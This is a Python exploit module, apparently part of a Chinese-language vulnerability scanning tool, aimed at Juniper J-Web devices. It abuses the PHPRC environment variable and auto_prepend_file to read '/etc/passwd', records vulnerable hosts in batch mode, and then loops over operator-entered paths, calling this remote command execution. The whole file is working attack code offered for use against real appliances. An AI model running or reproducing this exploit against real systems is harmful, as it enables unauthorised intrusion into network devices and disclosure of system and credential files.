# body="./images/lg_05_1.gif"
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Junper_J_WebRce:
	def scan(self,baseurl):
		url=baseurl+"/?PHPRC=/dev/fd/0"
		try:
			header = {
				"Host":baseurl.split("://")[-1],
				"User-Agent":self.headers,
				"Content-Type":"application/x-www-form-urlencoded",
				"Sec-Ch-Ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google',
				'Sec-Ch-Ua-Mobile': '?0',
				'Sec-Fetch-Site': 'same-origin',
				'Sec-Fetch-Mode': 'no-cors',
				'Sec-Fetch-Dest': 'script',
				"Referer": baseurl.split("://")[-1],
				'Accept-Encoding': 'gzip, deflate',
				'Accept-Language': 'zh-CN,zh;q=0.9'
			}
			data = 'auto_prepend_file="/etc/passwd"'
			response = requests.post(url=url,headers=header,data=data,verify=self.ssl,proxies=self.proxy,timeout=15)
			if "root:x" in response.text:
				OutPrintInfoSuc("Junper",f"存在Junper J-Web远程命令执行 {url}")
				if not self.batch:
					OutPrintInfo("Junper",f"Request Data: {data}")
					OutPrintInfo("Junper",f"Response:\n {response.text.strip()}")
				else:
					with open("./result/juniper_j_web_rce.txt","a") as w:
						w.write(f"{url}\n")
				return True
			else:
				if not self.batch:
					OutPrintInfo("Junper","不存在Junper J-Web 远程命令执行")
				return False
		except Exception:
			if not self.batch:
				OutPrintInfo("Junper", "不存在Junper J-Web 远程命令执行")
			return False

	def scan2(self, baseurl,cmd):
		url = baseurl + "/?PHPRC=/dev/fd/0"
		try:
			header = {
				"Host": baseurl.split("://")[-1],
				"User-Agent": self.headers,
				"Content-Type": "application/x-www-form-urlencoded",
				"Sec-Ch-Ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google',
				'Sec-Ch-Ua-Mobile': '?0',
				'Sec-Fetch-Site': 'same-origin',
				'Sec-Fetch-Mode': 'no-cors',
				'Sec-Fetch-Dest': 'script',
				"Referer": baseurl.split("://")[-1],
				'Accept-Encoding': 'gzip, deflate',
				'Accept-Language': 'zh-CN,zh;q=0.9'
			}
			data = f'auto_prepend_file="{cmd}"'
			response = requests.post(url=url, headers=header, data=data, verify=self.ssl, proxies=self.proxy,
									 timeout=15)
			print(response.text.strip())

		except Exception:
			OutPrintInfo("Junper", "不存在Junper J-Web 远程命令执行")


	def main(self,target):
		self.batch = target["batch_work"]

		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("Junper", '开始执行Junper J-Web 远程命令执行')
		if self.scan(url):
			if not self.batch:
				choose = Prompt.ask("[b yellow]是否进行RCE利用([b bright_red]y/n[/b bright_red])")
				if choose == "y":
					while True:
						OutPrintInfo("Junper", '命令填写文件路径')
						cmd = Prompt.ask("[b yellow]输入需要执行对命令")
						if cmd == "exit":
							break
						self.scan2(url,cmd)

				else:
					return
		if not self.batch:
			OutPrintInfo("Junper", 'Junper J-Web 远程命令执行执行结束')